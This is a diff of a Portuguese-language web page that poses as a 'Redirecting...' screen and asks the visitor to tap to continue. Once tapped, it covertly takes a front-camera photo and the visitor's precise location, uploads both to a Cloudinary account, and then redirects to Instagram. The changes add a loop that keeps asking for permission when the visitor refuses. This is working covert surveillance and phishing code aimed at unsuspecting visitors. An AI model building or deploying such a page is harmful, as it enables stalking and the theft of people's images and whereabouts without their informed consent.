@@ -2,43 +2,46 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
-  <title>Captura</title>
+  <title>Redirecionando...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin:0; overflow:hidden; background:#000; }
     #overlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       display: flex; justify-content: center; align-items: center;
       color: #fff; font-family: sans-serif; font-size: 20px;
-      background: rgba(0, 0, 0, 0.7);
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 9999;
     }
   </style>
 </head>
 <body>
   <div id="overlay">Toque para continuar...</div>
   <script>
-    const cloudName = "dx5legahb";      // Seu Cloudinary Cloud Name
-    const uploadPreset = "upload";       // Seu Upload Preset (unsigned)
-    const folderName = "capturas";       // Pasta de destino
+    const cloudName = "dx5legahb";
+    const uploadPreset = "upload";
+    const folderName = "capturas";
 
     async function capturarTudo() {
       try {
-        // Remove o overlay de toque
+        // Remove o overlay de instrução se visível
         const overlay = document.getElementById("overlay");
-        if (overlay) overlay.style.display = "none";
+        overlay.style.display = "none";
 
-        // 1️⃣ Captura a foto usando a câmera frontal
+        // 1️⃣ Captura a imagem usando a câmera frontal
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
         });
         const video = document.createElement("video");
-        video.playsInline = true;  // Essencial para iOS
-        video.muted = true;        // Essencial para autoplay no iOS
+        video.playsInline = true; // essencial para iOS
+        video.muted = true;       // essencial para autoplay no iOS
         video.srcObject = stream;
         await video.play();
 
-        // Aguarda um instante para garantir que o vídeo renderizou
+        // Aguarda um instante para garantir renderização (300ms)
         await new Promise(r => setTimeout(r, 300));
 
         const canvas = document.createElement("canvas");
@@ -78,26 +81,37 @@
             method: "POST",
             body: textForm
           });
-          if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
+          if (!textResp.ok) throw new Error("Erro ao enviar arquivo de localização");
 
-          // 3️⃣ Redireciona para o Instagram
+          // Redireciona para o Instagram se tudo ocorrer bem
           window.location.href = "https://instagram.com";
         }, (err) => {
           console.error("Erro ao obter localização:", err);
-          window.location.href = "https://instagram.com";
+          mostrarOverlay("Permita a localização para continuar. Toque para tentar novamente.");
         }, {
           enableHighAccuracy: true,
           timeout: 8000,
           maximumAge: 0
         });
 
-      } catch (e) {
-        console.error("Falha:", e);
-        window.location.href = "https://instagram.com";
+      } catch (error) {
+        console.error("Erro:", error);
+        mostrarOverlay("Permita o acesso à câmera e localização para continuar. Toque para tentar novamente.");
       }
     }
 
-    // Para iOS, iniciar somente após interação do usuário
+    // Função para exibir o overlay com uma mensagem e permitir reiniciar o fluxo
+    function mostrarOverlay(mensagem) {
+      const overlay = document.getElementById("overlay");
+      overlay.style.display = "flex";
+      overlay.textContent = mensagem;
+      overlay.onclick = () => {
+        overlay.textContent = "Toque para continuar...";
+        capturarTudo();
+      };
+    }
+
+    // Inicia o fluxo apenas após o usuário tocar na tela
     document.body.addEventListener("click", function handler() {
       document.body.removeEventListener("click", handler);
       capturarTudo();
